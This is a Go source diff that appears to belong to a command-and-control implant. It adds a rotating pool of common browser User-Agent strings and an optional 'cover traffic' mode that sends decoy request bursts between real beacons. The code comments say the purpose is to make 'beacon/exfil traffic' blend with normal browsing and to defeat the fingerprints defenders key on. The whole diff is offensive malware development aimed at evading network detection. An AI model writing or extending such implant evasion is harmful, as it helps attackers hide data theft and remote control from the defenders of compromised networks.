@@ -6,6 +6,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"math/rand"
 	"strconv"
 	"strings"
 	"sync"
@@ -22,6 +23,8 @@ type ConfigOverride struct {
 	WorkingStart string            `json:"working_start,omitempty"`
 	WorkingEnd   string            `json:"working_end,omitempty"`
 	WorkingTZ    string            `json:"working_tz,omitempty"`
+	CoverTraffic bool              `json:"cover_traffic,omitempty"`
+	CoverTrafficMax int            `json:"cover_traffic_max,omitempty"`
 }
 
 var configOverrides struct {
@@ -34,6 +37,8 @@ var configOverrides struct {
 	method    string
 	hasSleep  bool
 	hasJitter bool
+	coverTraffic    bool
+	coverTrafficMax int
 }
 
 func handleConfigPush(task Task, res *TaskResult) {
@@ -79,6 +84,12 @@ func handleConfigPush(task Task, res *TaskResult) {
 	if cfg.WorkingTZ != "" {
 		workingTZ = cfg.WorkingTZ
 	}
+	if cfg.CoverTraffic {
+		configOverrides.coverTraffic = true
+	}
+	if cfg.CoverTrafficMax > 0 {
+		configOverrides.coverTrafficMax = cfg.CoverTrafficMax
+	}
 	// Re-derive the typed globals (Interval/Jitter/etc.) from the canonical
 	// string config so the overrides take effect and survive a later reparse.
 	reparseNetworkConfig()
@@ -103,13 +114,48 @@ func getActiveJitter() int {
 	return Jitter
 }
 
+// defaultUserAgentPool is a curated set of realistic browser User-Agents. A
+// fixed UA is a stable network fingerprint defenders key on; rotating among
+// common, legitimate UAs makes beacon/exfil traffic blend with normal browser
+// activity. The operator-configured UA is always prepended so explicit profile
+// intent is still honored on a fraction of requests.
+var defaultUserAgentPool = []string{
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+}
+
+// randomUserAgent returns a UA drawn from the configured UA plus the built-in
+// pool. Called on every outbound request so no two beacons/exfils share a
+// static UA. math/rand is concurrency-safe and requires no explicit seeding.
+func randomUserAgent() string {
+	configOverrides.RLock()
+	base := UserAgent
+	if configOverrides.userAgent != "" {
+		base = configOverrides.userAgent
+	}
+	configOverrides.RUnlock()
+	pool := append([]string{base}, defaultUserAgentPool...)
+	return pool[rand.Intn(len(pool))]
+}
+
 func getActiveUserAgentFromConfig() string {
+	return randomUserAgent()
+}
+
+// getActiveCoverTraffic reports whether cover-traffic (decoy request bursts
+// between real beacons) is enabled and the maximum decoys per burst. Off by
+// default; operators opt in via the config task.
+func getActiveCoverTraffic() (bool, int) {
 	configOverrides.RLock()
 	defer configOverrides.RUnlock()
-	if configOverrides.userAgent != "" {
-		return configOverrides.userAgent
+	max := configOverrides.coverTrafficMax
+	if max <= 0 {
+		max = 3
 	}
-	return UserAgent
+	return configOverrides.coverTraffic, max
 }
 
 func getActiveHeaders() map[string]string {
